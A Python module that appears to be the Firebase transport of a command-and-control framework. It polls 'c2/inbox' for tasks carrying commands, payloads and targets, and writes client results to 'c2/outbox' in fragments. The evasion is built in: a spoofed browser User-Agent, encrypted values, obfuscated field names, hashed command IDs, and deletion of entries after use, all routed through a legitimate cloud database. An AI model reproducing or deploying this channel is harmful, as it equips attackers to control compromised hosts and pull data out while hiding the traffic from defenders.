import hashlib
import json
import os
from typing import Optional

import requests

import common
from channel.base import Channel


def _get_column_map(env_key: str) -> dict:
    """Load {logical_name: obfuscated_field_name} from env var.
    Returns empty dict if unset — code uses logical field names as-is.
    """
    raw = os.environ.get(env_key, "").strip()
    if not raw:
        return {}
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        print(f"[warn] {env_key} is not valid JSON — falling back to logical field names")
        return {}


def _translate_row(row: dict, column_map: dict) -> dict:
    """Translate obfuscated field keys → logical names using reverse of column_map.
    Keys not present in the map pass through unchanged.
    """
    if not column_map:
        return row
    reverse = {v: k for k, v in column_map.items()}
    return {reverse.get(k, k): v for k, v in row.items()}


def _obfuscate_row(row: dict, column_map: dict) -> dict:
    """Translate logical field names → obfuscated keys using column_map.
    Keys not present in the map pass through unchanged.
    """
    if not column_map:
        return row
    return {column_map.get(k, k): v for k, v in row.items()}

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

_HEADERS = {
    "User-Agent":      _UA,
    "Accept":          "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}


def _path_key(command_id: str) -> str:
    """Return a short opaque path key derived from command_id.

    Hashing prevents command_id content (e.g. "heartbeat-<uuid>") from
    appearing as a readable key in the Firebase database tree.
    Deterministic so delete_task/delete_result can reconstruct the same key.
    """
    return hashlib.sha256(command_id.encode()).hexdigest()[:12]


def _entry_key(data: dict) -> str:
    """Derive a unique opaque Firebase path key from a data row.

    Non-fragment rows: SHA-256[:12] of command_id.
    Fragment rows (status="frag:N:T"): "{hash}_f{N}" so that multiple
    fragments for the same command don't overwrite each other.
    """
    cmd_id = data.get("command_id", "unknown")
    status = data.get("status", "")
    if status.startswith("frag:"):
        parts = status.split(":")
        try:
            return f"{_path_key(cmd_id)}_f{int(parts[1])}"
        except (IndexError, ValueError):
            pass
    return _path_key(cmd_id)


class FirebaseChannel(Channel):
    def __init__(self):
        super().__init__()
        # Firebase REST polling is faster than CSV export — 3s default.
        self._refresh_interval = 3.0

    # ------------------------------------------------------------------
    # URL helpers
    # ------------------------------------------------------------------

    def _base(self) -> str:
        return os.environ["FIREBASE_URL"].rstrip("/")

    def _inbox_url(self, suffix: str = "") -> str:
        path = os.environ.get("FIREBASE_INBOX_PATH", "c2/inbox").strip("/")
        return f"{self._base()}/{path}{suffix}.json"

    def _outbox_url(self, suffix: str = "") -> str:
        path = os.environ.get("FIREBASE_OUTBOX_PATH", "c2/outbox").strip("/")
        return f"{self._base()}/{path}{suffix}.json"

    # ------------------------------------------------------------------
    # Low-level REST operations
    # ------------------------------------------------------------------

    def _read(self, url: str, column_map: Optional[dict] = None) -> list:
        """GET a Firebase path. Returns list of decrypted, de-obfuscated row dicts."""
        try:
            resp = requests.get(url, headers=_HEADERS, timeout=15)
            resp.raise_for_status()
            data = resp.json()
            if not data:
                return []
            enc = common.get_encryptor()
            col_map = column_map if column_map is not None else {}
            rows = []
            for entry in data.values():
                if isinstance(entry, dict):
                    row = _translate_row(entry, col_map)      # obfuscated keys → logical
                    row = common._decrypt_row(row, enc)        # decrypt values
                    rows.append(row)
            return rows
        except Exception as e:
            print(f"[error] Firebase read failed: {e}")
            return []

    def _write(self, url: str, data: dict, column_map: Optional[dict] = None) -> bool:
        """PUT a dict to a Firebase path. Returns True on success."""
        enc = common.get_encryptor()
        col_map = column_map if column_map is not None else {}
        encrypted = common._encrypt_row(data, enc)            # encrypt values first
        obfuscated = _obfuscate_row(encrypted, col_map)       # logical keys → obfuscated
        try:
            resp = requests.put(url, json=obfuscated, headers=_HEADERS, timeout=15)
            return resp.ok
        except Exception as e:
            print(f"[error] Firebase write failed: {e}")
            return False

    def _delete(self, url: str) -> bool:
        """DELETE a Firebase path. Returns True on success."""
        try:
            resp = requests.delete(url, headers=_HEADERS, timeout=15)
            return resp.ok
        except Exception as e:
            print(f"[error] Firebase delete failed: {e}")
            return False

    # ------------------------------------------------------------------
    # Channel interface
    # ------------------------------------------------------------------

    def read_inbox(self) -> list:
        col_map = _get_column_map("FIREBASE_INBOX_COLUMN_MAP")
        rows = self._read(self._inbox_url(), col_map)
        return common._reassemble_fragments(rows, "payload", "pending")

    def read_outbox(self) -> list:
        col_map = _get_column_map("FIREBASE_OUTBOX_COLUMN_MAP")
        rows = self._read(self._outbox_url(), col_map)
        return common._reassemble_fragments(rows, "result", "success")

    def write_task(self, data: dict) -> bool:
        col_map = _get_column_map("FIREBASE_INBOX_COLUMN_MAP")
        url = self._inbox_url(f"/{_entry_key(data)}")
        return self._write(url, data, col_map)

    def write_result(self, data: dict) -> bool:
        col_map = _get_column_map("FIREBASE_OUTBOX_COLUMN_MAP")
        url = self._outbox_url(f"/{_entry_key(data)}")
        return self._write(url, data, col_map)

    # ------------------------------------------------------------------
    # Cleanup — Firebase supports DELETE unlike Sheets
    # ------------------------------------------------------------------

    @property
    def supports_cleanup(self) -> bool:
        return True

    def delete_task(self, command_id: str) -> bool:
        """Delete an inbox entry by command_id.
        Note: only deletes the primary entry key. Fragment keys ({hash}_fN)
        are left in place and cleaned up on the next scheduled clear.
        """
        return self._delete(self._inbox_url(f"/{_path_key(command_id)}"))

    def delete_result(self, command_id: str) -> bool:
        """Delete an outbox entry by command_id."""
        return self._delete(self._outbox_url(f"/{_path_key(command_id)}"))

    # ------------------------------------------------------------------
    # Fragment builders
    # ------------------------------------------------------------------

    def build_outbox_fragments(self, data: dict, chunks: list) -> list:
        total = len(chunks)
        return [
            {
                "command_id": data["command_id"],
                "client_id":  data.get("client_id", ""),
                "status":     f"frag:{i}:{total}",
                "result":     chunk,
                "timestamp":  data.get("timestamp", ""),
            }
            for i, chunk in enumerate(chunks)
        ]

    def build_inbox_fragments(self, data: dict, chunks: list) -> list:
        total = len(chunks)
        return [
            {
                "command_id": data["command_id"],
                "command":    data.get("command", ""),
                "payload":    chunk,
                "target":     data.get("target", ""),
                "status":     f"frag:{i}:{total}",
                "created_at": data.get("created_at", ""),
            }
            for i, chunk in enumerate(chunks)
        ]
